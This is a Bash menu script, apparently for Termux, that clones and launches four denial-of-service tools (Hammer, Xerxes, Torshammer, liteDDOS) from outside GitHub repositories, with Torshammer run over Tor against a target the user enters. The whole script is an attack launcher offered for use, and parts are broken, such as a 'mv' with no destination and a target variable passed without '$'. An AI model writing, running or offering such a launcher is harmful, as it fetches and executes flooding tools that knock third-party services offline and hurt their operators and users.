#!/system/xbin/bash

clear

yellow='\033[33;1m'

green='\033[32;1m'

red='\033[31;1m'

echo ""

clear

figlet "Xienan"|lolcat

echo "\033[33;1m|====================================|"

echo "\033[31;1m|+_______Author: Xienan Chefao_______+"

echo "\033[32;1m|+_______Team: Funny Cyber Team _____+"

echo "\033[31;1m|+_______Contact: 0895359088252______+"



echo "\033[33;1m|====================================|"

echo $green

echo "======================================="|lolcat

echo "1. Hammer"|lolcat

echo "======================================="|lolcat

echo "2. Xerxes"|lolcat

echo "======================================="|lolcat

echo "3. Torshammer"|lolcat

echo "======================================="|lolcat

echo "4. liteDDOS"|lolcat

echo "======================================="|lolcat

echo "5. EXIT?"|lolcat

echo "======================================="|lolcat

read -p "Pilih angkanya y guys V:" nas


if [ $nas = 1 ] || [ $nas = 1 ]

then

clear

git clone https://github.com/cyweb/hammer 

cd hammer

python hammer

python hammer.py

fi


if [ $nas = 2 ] || [ $nas = 2 ]

then

clear

git clone https://github.com/zanyarjamal/xerxes

ls

cd xerxes

ls

clang xerxes.c -o xerxes

ls

./xerxes

fi


if [ $nas = 3 ] || [ $nas = 3 ]

then

clear

toilet -f standard -F gay "DDoS"

apt install tor

git clone https://github.com/dotfighter/torshammer.git

mv torshammer

cd torshammer

read -p "Enter target" target

python2 torshammer.py -T -t target

fi


if [ $nas = 4 ] || [ $nas = 4 ]

then

clear

git clone https://github.com/4L13199/LITEDDOS

cd LITEDDOS

python2 liteDDOS.py

fi

if [ $nas = 5 ] || [ $nas = 5 ]

then

clear

figlet "See You"
figlet "Jangan kangen ya :v"

sleep 3

clear

fi

